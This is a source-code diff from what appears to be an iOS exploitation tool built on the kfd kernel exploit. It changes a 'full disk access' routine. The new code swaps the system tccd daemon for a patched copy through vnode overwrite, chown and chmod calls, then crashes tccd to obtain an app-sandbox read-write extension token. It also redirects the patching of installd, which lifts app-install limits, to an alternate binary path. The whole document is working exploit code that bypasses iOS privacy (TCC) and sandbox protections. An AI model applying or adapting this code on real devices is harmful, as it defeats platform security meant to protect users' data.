@@ -311,83 +311,45 @@ static bool overwrite_file(char* to, char* from) {
     return true;
 }
 
-static void grant_full_disk_access_impl(void (^completion)(NSString* extension_token,
-                                                           NSError* _Nullable error)) {
-    char* targetPath = "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd";
-    int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
-    if (fd == -1) {
-        // iOS 15.3 and below
-        targetPath = "/System/Library/PrivateFrameworks/TCC.framework/tccd";
-        fd = open(targetPath, O_RDONLY | O_CLOEXEC);
-    }
-    off_t targetLength = lseek(fd, 0, SEEK_END);
-    lseek(fd, 0, SEEK_SET);
-    void* targetMap = mmap(nil, targetLength, PROT_READ, MAP_SHARED, fd, 0);
-    
-    NSData* originalData = [NSData dataWithBytes:targetMap length:targetLength];
-    NSData* sourceData = patchTCCD(targetMap, targetLength);
-    if (!sourceData) {
-        completion(nil, [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
-                                            code:5
-                                        userInfo:@{NSLocalizedDescriptionKey : @"Can't patchfind."}]);
-        return;
-    }
-    
-    NSURL* documentDirectory = [NSFileManager.defaultManager URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask][0];
-    NSURL* tccd_orig = [documentDirectory URLByAppendingPathComponent:@"tccd_orig.bin"];
-    NSURL* tccd_patched = [documentDirectory URLByAppendingPathComponent:@"tccd_patched.bin"];
-    
-    [[NSFileManager defaultManager] removeItemAtURL:tccd_orig error:nil];
-    [[NSFileManager defaultManager] removeItemAtURL:tccd_patched error:nil];
-    
-    [originalData writeToURL:tccd_orig atomically:true];
-    [sourceData writeToURL:tccd_patched atomically:true];
-    
-//    if (!overwrite_file(targetPath, tccd_patched.path.UTF8String)) {
-//        overwrite_file(targetPath, tccd_orig.path.UTF8String);
-//        munmap(targetMap, targetLength);
-//        completion(
-//                   nil, [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
-//                                            code:1
-//                                        userInfo:@{
-//                    NSLocalizedDescriptionKey : @"Can't overwrite file: your device may "
-//                    @"not be vulnerable to CVE-2022-46689."
-//                   }]);
-//        return;
-//    }
-//    munmap(targetMap, targetLength);
-    
-//    xpc_crasher("com.apple.tccd");
-//    sleep(1);
-    //Even FREEZING when overwrite original data
-    overwrite_file(targetPath, tccd_patched.path.UTF8String);
-    kfd_xpc_crasher("com.apple.tccd");
-//    call_tccd(^(NSString* _Nullable extension_token) {
-//        overwrite_file(targetPath, tccd_orig.path.UTF8String);
-//        xpc_crasher("com.apple.tccd");
-//        NSError* returnError = nil;
-//        if (extension_token == nil) {
-//            returnError =
-//            [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
-//                                code:2
-//                            userInfo:@{
-//                NSLocalizedDescriptionKey : @"tccd did not return an extension token."
-//            }];
-//        } else if (![extension_token containsString:@"com.apple.app-sandbox.read-write"]) {
-//            returnError = [NSError
-//                           errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
-//                           code:3
-//                           userInfo:@{
-//                NSLocalizedDescriptionKey : @"tccd patch failed: returned a media library token "
-//                @"instead of an app sandbox token."
-//            }];
-//            extension_token = nil;
-//        }
-//        completion(extension_token, returnError);
-//    });
-}
-
+ static void grant_full_disk_access_impl(void (^completion)(NSString* extension_token,
+                                                            NSError* _Nullable error)) {
+     char* targetPath = "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd";
+     char* pwntargetPath = "/Developer/System/Library/PrivateFrameworks/TCC.framework/Support/tccd";
+     char* sylinkPath = "/Developer/tccd";
+     funVnodeOverwrite2(targetPath, pwntargetPath);
+     funVnodeChown("/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0, 0);
+     funVnodeChmod("/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
+     funVnodeChown("/Developer/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0, 0);
+     funVnodeChmod("/Developer/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
+     funVnodeChown("/Developer/tccd", 0, 0);
+     funVnodeChmod("/Developer/tccd", 0100755);
+     kfd_xpc_crasher("com.apple.tccd");
+     call_tccd(^(NSString* _Nullable extension_token) {
+         kfd_xpc_crasher("com.apple.tccd");
+         NSError* returnError = nil;
+         if (extension_token == nil) {
+             returnError =
+             [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
+                                 code:2
+                             userInfo:@{
+                 NSLocalizedDescriptionKey : @"tccd did not return an extension token."
+             }];
+         } else if (![extension_token containsString:@"com.apple.app-sandbox.read-write"]) {
+             returnError = [NSError
+                            errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
+                            code:3
+                            userInfo:@{
+                 NSLocalizedDescriptionKey : @"tccd patch failed: returned a media library token "
+                 @"instead of an app sandbox token."
+             }];
+             extension_token = nil;
+         }
+         completion(extension_token, returnError);
+     });
+ }
+ 
 void kfd_grant_full_disk_access(void (^completion)(NSError* _Nullable)) {
+    printf("[i] w/kfd\n");
     if (!NSClassFromString(@"NSPresentationIntent")) {
         // class introduced in iOS 15.0.
         // TODO(zhuowei): maybe check the actual OS version instead?
@@ -410,6 +372,7 @@ void kfd_grant_full_disk_access(void (^completion)(NSError* _Nullable)) {
                                                      encoding:NSUTF8StringEncoding
                                                         error:&error];
     if (cachedToken) {
+        printf("[i] cachedToken");
         int64_t handle = sandbox_extension_consume(cachedToken.UTF8String);
         if (handle > 0) {
             // cached version worked
@@ -447,7 +410,7 @@ struct installd_remove_app_limit_offsets {
     uint64_t offset_return_true;
 };
 
-struct installd_remove_app_limit_offsets gAppLimitOffsets = {
+struct installd_remove_app_limit_offsets kfd_gAppLimitOffsets = {
     .offset_objc_method_list_t_MIInstallableBundle = 0x519b0,
     .offset_objc_class_rw_t_MIInstallableBundle_baseMethods = 0x804e8,
     .offset_data_const_end_padding = 0x79c38,
@@ -590,8 +553,9 @@ static NSData* make_patch_installd(void* executableMap, size_t executableLength)
 }
 
 bool kfd_patch_installd() {
-    const char* targetPath = "/usr/libexec/installd";
-    int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
+    char* targetPath = "/usr/libexec/installd";
+    char* oldtargetPath = "/Developer/usr/libexec/installd";
+    int fd = open(oldtargetPath, O_RDONLY | O_CLOEXEC);
     off_t targetLength = lseek(fd, 0, SEEK_END);
     lseek(fd, 0, SEEK_SET);
     void* targetMap = mmap(nil, targetLength, PROT_READ, MAP_SHARED, fd, 0);
